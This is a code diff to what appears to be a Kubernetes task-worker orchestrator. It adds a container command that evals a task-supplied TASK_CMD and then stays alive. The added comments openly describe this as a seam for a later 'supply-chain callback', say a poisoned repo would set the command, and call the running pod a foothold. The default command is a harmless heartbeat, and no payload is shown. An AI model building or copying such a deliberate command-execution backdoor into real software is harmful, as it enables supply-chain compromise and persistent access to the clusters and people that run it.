@@ -34,6 +34,12 @@ WORKER_REPLICAS = int(os.environ.get("WORKER_REPLICAS", "1"))
 # Hard ceiling on total workers, so repeatedly pushing tasks onto the queue
 # cannot fill a node. Tasks beyond this stay queued until a worker frees up.
 MAX_WORKERS = int(os.environ.get("MAX_WORKERS", "6"))
+# What a task worker runs the moment it starts, when the task itself carries no
+# command. A benign heartbeat by default - this is the seam the supply-chain
+# callback slots into later (a poisoned repo would set the task's cmd instead).
+DEFAULT_TASK_CMD = os.environ.get(
+    "DEFAULT_TASK_CMD", "while true; do echo heartbeat; sleep 30; done"
+)
 WORKER_IMAGE = os.environ.get(
     "WORKER_IMAGE", "ghcr.io/magier/ikt26/agentbox:latest"
 )
@@ -132,32 +138,35 @@ def worker_manifest(task=None):
     """
     labels = dict(OWNED)
     labels["role"] = "task" if task else "baseline"
-    env = []
+    container = {
+        "name": "worker",
+        "image": WORKER_IMAGE,
+        "imagePullPolicy": WORKER_PULL_POLICY,
+        "ports": [{"name": "http", "containerPort": 8080}],
+        "resources": {
+            "requests": {"cpu": "50m", "memory": "128Mi"},
+            "limits": {"cpu": "500m", "memory": "512Mi"},
+        },
+    }
     if task:
         labels["task"] = str(task.get("id", ""))[:63]
-        env = [
+        cmd = str(task.get("cmd") or DEFAULT_TASK_CMD)
+        container["env"] = [
             {"name": "TASK_ID", "value": str(task.get("id", ""))},
             {"name": "TASK_REPO", "value": str(task.get("repo", ""))},
+            {"name": "TASK_CMD", "value": cmd},
         ]
+        # Run the task's action the moment the worker starts (a heartbeat by
+        # default), then stay alive as a foothold. eval reads the command from
+        # the env so nothing has to be shell-escaped into the pod manifest.
+        container["command"] = ["sh", "-c", 'eval "$TASK_CMD"; sleep infinity']
     return {
         "apiVersion": "v1",
         "kind": "Pod",
         "metadata": {"generateName": "agent-worker-", "labels": labels},
         "spec": {
             "serviceAccountName": WORKER_SA,
-            "containers": [
-                {
-                    "name": "worker",
-                    "image": WORKER_IMAGE,
-                    "imagePullPolicy": WORKER_PULL_POLICY,
-                    "ports": [{"name": "http", "containerPort": 8080}],
-                    "env": env,
-                    "resources": {
-                        "requests": {"cpu": "50m", "memory": "128Mi"},
-                        "limits": {"cpu": "500m", "memory": "512Mi"},
-                    },
-                }
-            ],
+            "containers": [container],
             # A bare, self-managed pod, not a Deployment: each worker is a task
             # runner the orchestrator owns the lifecycle of. Reinventing a slice
             # of a ReplicaSet is the point - it is why the SA needs create pods.
